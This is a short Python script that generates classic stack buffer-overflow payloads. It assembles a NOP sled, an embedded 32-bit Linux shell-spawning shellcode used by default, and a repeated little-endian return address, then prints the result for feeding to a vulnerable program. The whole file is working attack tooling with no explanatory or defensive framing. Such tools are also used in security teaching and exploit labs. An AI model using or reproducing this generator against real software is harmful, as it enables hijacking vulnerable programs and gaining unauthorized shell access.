#!/usr/bin/env python

import sys
import argparse

nop = "\x90"
default_shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

def parse_arguments():
    parser = argparse.ArgumentParser(description='Generates payloads for buffer\
            overflows')
    parser.add_argument('-t', '--target', default="", type=str)
    parser.add_argument('-r', '--target_repeat', default=1, type=int)
    parser.add_argument('-s', '--shellcode', default="", type=str)
    parser.add_argument('-n', '--nop_repeat', default=0, type=int)
    parser.add_argument('-d', '--distance', type = int)
    args = parser.parse_args()
    
    return args

def handle_target(target, target_repeat):
    if target == None:
        return
    if target.startswith('0x') and len(target) == 10:
        target = target[2:]
    elif len(target) != 8:
        raise ValueError('Target address is not valid')
    try:
        _ = int(target, 16)
    except Exception:
        raise ValueError('Target address has not a valid format')

    target = "".join([chr(int(c, 16)) for c in [target[i:i+2] for i in range(0, \
            len(target), 2)][::-1]])
    return target * target_repeat

def handle_shellcode(shellcode):
    if shellcode == "":
        #print('No shellcode specified. Shell-spawing shellcode will be used')
        shellcode = default_shellcode
    return shellcode

def handle_nop(nop_repeat, offset):
    return "\x90" * (nop_repeat + offset)

def handle_arguments(target, shellcode, nop_repeat, target_repeat):
    shellcode = handle_shellcode(shellcode)
    nop_sled = handle_nop(nop_repeat, (4 - nop_repeat - len(shellcode)) % 4)
    target_sled = handle_target(target, target_repeat)
    return nop_sled, shellcode, target_sled

def generate_exploit(nop_sled, shellcode, target_sled):
    payload = nop_sled
    payload += shellcode
    payload += target_sled
    return payload

if __name__ == '__main__':
    args = parse_arguments()
    nop_sled, shellcode, target_sled = handle_arguments(args.target,
            args.shellcode,
            args.nop_repeat,
            args.target_repeat)
    payload = generate_exploit(nop_sled, shellcode, target_sled)
    print(payload),
